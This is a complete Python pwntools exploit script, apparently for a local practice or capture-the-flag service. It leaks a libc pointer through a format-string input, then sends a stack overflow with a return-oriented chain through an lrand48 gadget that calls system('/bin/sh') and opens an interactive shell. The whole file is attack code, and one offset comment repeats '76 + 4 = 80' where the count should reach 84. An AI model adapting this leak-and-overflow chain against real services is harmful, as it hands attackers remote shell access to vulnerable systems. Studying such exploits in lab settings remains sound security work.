#exploit1.py

from pwn import *

libc_offset = 0x69150
system_offset = 0x37154
lrand48_offset = 0x2efd4
binsh_offset = 0x11d588

r = remote('127.0.0.1', 6987)

# Read until the input prompt
r.recvuntil(':>')

print '[+] Leaking a pointer to libc'
r.sendline('%7$08x')
libc_ptr = int(r.readline().strip(), 16)
print '[+] Leaked pointer:', hex(libc_ptr)
print '[*] Calculating actual addresses...'

libc_base = libc_ptr - libc_offset
system_addr = libc_base + system_offset
lrand48_addr = libc_base + lrand48_offset
binsh_addr = libc_base + binsh_offset

print '[+] libc base =', hex(libc_base)
print '[+] &system =', hex(system_addr)
print '[+] &lrand48 =', hex(lrand48_addr)
print '[+] &binsh =', hex(binsh_addr)

r.recvuntil(':>')

print '[*] Generating exploit string...'

# 68 filler bytes
exploit_str = 'A'*68

# Offset 68 (address of ret2zp gadget in lrand48)
exploit_str +=  p32(lrand48_addr)

# Offset 68 + 4 = 72 (4 filler bytes)
exploit_str +=  'AAAA'

# Offset 72 + 4 = 76 (address of /bin/sh)
exploit_str +=  p32(binsh_addr)

# Offset 76 + 4 = 80 (4 filler bytes)
exploit_str +=  'AAAA'

# Offset 76 + 4 = 80 (address of system)
exploit_str +=  p32(system_addr)

print '[+] exploit string =', exploit_str.encode('hex')
print '[*] Sending exploit...'

r.sendline(exploit_str)
r.interactive()